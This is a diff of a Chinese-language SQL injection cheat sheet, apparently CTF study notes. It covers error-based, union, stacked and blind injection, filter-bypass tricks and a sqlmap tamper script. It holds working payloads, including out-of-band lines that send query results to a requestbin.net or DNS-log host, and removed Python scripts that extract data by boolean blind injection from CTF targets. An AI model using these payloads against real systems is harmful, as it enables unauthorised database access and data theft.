@@ -33,31 +33,19 @@ select group_concat(table_name)from sys.schema_table_statistics_with_buffer wher
 select group_concat(table_name) from mysql.innodb_table_stats
 ```
 
-## 技巧
+## 注入方式
 
-* 加`()、/**/` bypass`空格`
+### 报错注入
 
-* `like` bypass `=`
+  * `updatexml(1,concat(1,(<SQLi>)),1)`
+  * `extractvalue(1,concat(1,<SQli>))`
 
-  >"%" 可用于定义通配符（模式中缺少的字母）
-  >
-  >从 "Persons" 表中选取居住在以 "g" 结尾的城市里的人
-  >
-  >```sql
-  >SELECT * FROM Persons
-  >WHERE City LIKE '%g'
-  >```
+### 联合注入
 
-* 利用双hex(保证纯数字字符)注入
-  ``'%2B(select hex(hex(database())))%2B'0``
-
-* GBK编码下 ``addslash()`` 绕过 宽字节绕过
-
-  ``%df%27``
-
-  原理就是 addslash后变成``%df%5c%27``了
-
-* multisql 堆叠注入
+```sql
+union select
+```
+### 堆叠注入
 
   * 利用show
     ```sql
@@ -93,56 +81,58 @@ select group_concat(table_name) from mysql.innodb_table_stats
     ...
     handler <handlername> close; #关闭句柄
     ```
-  * ``alter rename``利用
+### 盲注
+#### 时间盲注
 
+  * 时间盲注
+
+    和布尔盲注类似，不过因为没有回显，采用网页响应时间来判定数据
+    
+    利用``SLEEP(n)``
+    
+    绕过
     ```sql
-    -- 修改表名(将表名user改为users)
-    alter table user rename to users;
-
-    -- 修改列名(将字段名username改为name)
-    alter table users change uesrname name varchar(30);
+    benchmark(1000000,sha(1))
+    pow(99,99)
     ```
 
-* 看回显点
+```python
+#payload="if((ascii(substr(({0}),{1},1)))>{2},sleep(3),0)--+".format(sql,i,mid)
+#payload="and case when (ascii(substr({},{},1))>{}) then (benchmark(1000000,sha(1))) else 2 end".format(sql,i,mid)
+#payload="if((ascii(substr(({0}),{1},1)))>{2},sleep(3),0)".format(sql,i,mid)
+```
 
+参考资料：https://www.anquanke.com/post/id/170626
+#### 布尔盲注
+
+  * 利用`if() ,like,or,>,=,<`
+
+  * ``>`` 可以用 ``greatest`` + ``=`` 绕过
+
+```python
+#payload="0^((ascii(substr(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
+#payload="0^((ascii(mid(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
+#payload="if((ascii(substr(({0}),{1},1)))>{2},1,0)".format(sql,i,mid)
+#payload="union select * from images where id=if((ascii(substr(({0}),{1},1)))>{2},1,0)#".format(sql,i,mid)
+```
+#### 带外盲注
+  
+* dblink postgresql
+
+  ```python
+  #poc = """a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=p password=1 dbname=ans{' || (%s) || '}d')) --""" % (sql)
+  #poc = """a' UNION SELECT 1,(SELECT dblink_connect('host=z' || (%s) || 'z.bb958293c85e2e52148a.d.requestbin.net user=p password=1 dbname=ans')) --""" % (sql)
+  ```
+*  load_file mysql 
+  
   ```sql
-  select 1,2,3,....
+  select load_file(concat('\\\\', (<sqli>), '.your-dnslog.com'));
   ```
 
-* 注释符
+## 绕过方式
 
-  * ``/**/``
-  * ``\# -> %23``
+* 加`()、/**/` bypass`空格`
 
-  * ``--`` 
-
-* ``order by``看字段数 先看看有几个回显点也可以用``group by``
-
-  ```sql
-  1' order by 3#
-  ->
-
-  1' order by 4#
-  ->
-  Error
-  ```
-
-* ``union`` 联合注入
-
-* ``limit``
-
-  ```sql
-  limit i,n
-  # tableName：表名
-  # i：为查询结果的索引值(默认从0开始)，当i=0时可省略i
-  # n：为查询结果返回的数量
-  # i与n之间使用英文逗号","隔开
-  ```
-
-* 报错注入
-
-  * `updatexml(1,concat(1,(<SQLi>)),1)`
-  * `extractvalue(1,concat(1,<SQli>))`
 
 * 无列名注入  
   考虑这样的表格，使用select 1,2,3,4,5 union select * from persons可以得到一张新的表格
@@ -197,122 +187,59 @@ select group_concat(table_name) from mysql.innodb_table_stats
   +-------+
   ```
 
-* 布尔盲注
+* `like` bypass `=`
 
-  * 利用`if() ,like,or,>,=,<`
+  >"%" 可用于定义通配符（模式中缺少的字母）
+  >
+  >从 "Persons" 表中选取居住在以 "g" 结尾的城市里的人
+  >
+  >```sql
+  >SELECT * FROM Persons
+  >WHERE City LIKE '%g'
+  >```
 
-  * ``>`` 可以用 ``greatest`` + ``=`` 绕过
-    greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。
+* 利用双hex(保证纯数字字符)注入
+  ``'%2B(select hex(hex(database())))%2B'0``
 
-    ```python
-    #coding=utf-8
-    import requests
-    import urllib
+* GBK编码下 ``addslash()`` 绕过 宽字节绕过
 
-    url="http://6074ac45-6b22-49a0-ae5a-38c5940e1c1e.node3.buuoj.cn/image.php"
-    #sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())" Result:admin,contents
-    #sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')" Result:id,username,password,is_enqble
-    #sql="select(group_concat(username))from(admin)" Result:a4341216,aebc38b6
-    #sql="select(group_concat(password))from(admin)" Result:0c9bb00f,8a9b3d5a
-    #sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')" Result:id,title,content,is_gnable
-    #sql="select(group_concat(content))from(contents)"
-    sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
-    ret=''
+  ``%df%27``
 
-    for i in range(1,50):
-      l=1
-      r=255
-      while(l+1<r):
-          mid=(l+r)/2
-          payload="if((ascii(substr(("+sql+"),"+str(i)+",1)))>"+str(mid)+",1,0)"
-          #print payload
-          param={"id":payload}
-          #print chr(mid)
-          req=requests.get(url,params=param).text
-          print req
-          if (len(req)>10):
-              l=mid
-          else :
-              r=mid
-      ret=ret+chr(r)
-      print "Result:"+ret
-    ```
+  原理就是 addslash后变成``%df%5c%27``了
 
-  * 利用0^1^0 并采取多线程
+* 看回显点
 
-```python
-#coding=utf-8
-import requests
-import threading
-url="http://d23fcdc7-5653-43bc-802e-afeb7d6efea4.node3.buuoj.cn/search.php?id="
+  ```sql
+  select 1,2,3,....
+  ```
 
-#sql="select(group_concat(username))from(admin)" 
-#sql="select(group_concat(password))from(admin)"
-#sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')"
-#sql="select(group_concat(content))from(contents)"
-#sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
-#Result:F1naI1y,Flaaaaag
-sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"
-#Result:id,username,password
-sql="select(group_concat(password))from(F1naI1y)"
-#sql="select(group_concat(password))from(users)"
-ret=''
-def booltest(start,end):
-    ret=""
-    for i in range(start,end):
-        l=1
-        r=255
-        while(l+1<r):
-            mid=(l+r)/2
-            payload="0^((ascii(substr(({0}),{1},1)))>{2})^0".format(sql,i,mid)
-            #payload="union select * from images where id=if(1>0,1,0)#"
-            #print payload
-            param = {
-                "id":payload,
-            }
-            #print chr(mid)
-            req=requests.get(url,params=param)
-            if (req.status_code != requests.codes.ok):
-                continue
-            #print req.text
-            if (len(req.text)>720):
-                l=mid
-            else :
-                r=mid
-        ret=ret+chr(r)
-        print(threading.current_thread().name+"working:"+ret) 
-    print(threading.current_thread().name+ret)
+* 注释符
 
+  * ``/**/``
+  * ``\# -> %23``
 
-thr1 = threading.Thread(target=booltest, args=(1, 4),name="1")
-thr2 = threading.Thread(target=booltest, args=(4, 8),name="2")
-thr3 = threading.Thread(target=booltest, args=(8, 12),name="3")
-thr4 = threading.Thread(target=booltest, args=(12, 16),name="4")
-thr5 = threading.Thread(target=booltest, args=(16, 20), name="5")
-thr6 = threading.Thread(target=booltest, args=(20, 24), name="6")
-thr7 = threading.Thread(target=booltest, args=(24, 28), name="7")
+  * ``--`` 
 
-thr1.start()
-thr2.start()
-thr3.start()
-thr4.start()
-thr5.start()
-thr6.start()
-thr7.start()
-```
-  * 时间盲注
+* ``order by``看字段数 先看看有几个回显点也可以用``group by``
 
-    和布尔盲注类似，不过因为没有回显，采用网页响应时间来判定数据
-    
-    利用``SLEEP(n)``
-    
-    绕过
-    ```sql
-    benchmark(1000000,sha(1))
-    pow(99,99)
-    ```
+  ```sql
+  1' order by 3#
+  ->
 
-    参考资料：https://www.anquanke.com/post/id/170626
+  1' order by 4#
+  ->
+  Error
+  ```
+
+* ``limit``
+
+  ```sql
+  limit i,n
+  # tableName：表名
+  # i：为查询结果的索引值(默认从0开始)，当i=0时可省略i
+  # n：为查询结果返回的数量
+  # i与n之间使用英文逗号","隔开
+  ```
 
   * 修改 ``||``(或)运算符为字符串连接符
     ``set sql_mode=PIPES_AS_CONCAT;`` 
@@ -465,6 +392,36 @@ select ifnull(nullif(1,2),3)
 >The nullif(X,Y) function returns its first argument if the arguments are different and NULL if the arguments are the same. The nullif(X,Y) function searches its arguments from left to right for an argument that defines a collating function and uses that collating function for all string comparisons. If neither argument to nullif() defines a collating function then the BINARY is used.
 
 
+### 利用 " ' ` [] 可以包裹列名的特性绕过
+
+```sql
+select Name from User
+->
+Name
+Eki
+John
+Alice
+
+select [Name][123] from User
+->
+123
+Eki
+John
+Alice
+```
+
+**Example**
+
+```sql
+CREATE TABLE $table_name (dummy1 TEXT, dummy2 TEXT, `$column` $type);
+
+table_name=[abc]as select [sql][&columns[0][name]=]from sqlite_master;&columns[0][type]=1
+->
+$sql = "CREATE TABLE [abc] as select [sql][ (dummy1 TEXT, dummy2 TEXT, `]from sqlite_master;` 1);";
+->
+create table [abc] as select sql from sqlite_master
+```
+
 ## SQLMAP
 
 基本流程
@@ -510,6 +467,12 @@ def dependencies():
  
 def tamper(payload, **kwargs):
     return "1`,"+payload+")#"
+```
+
+## JDBC 注入
+
+```
+jdbc:mysql://localhost:3306/数据库名?user=用户名&password=密码&useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT
 ```
 
 
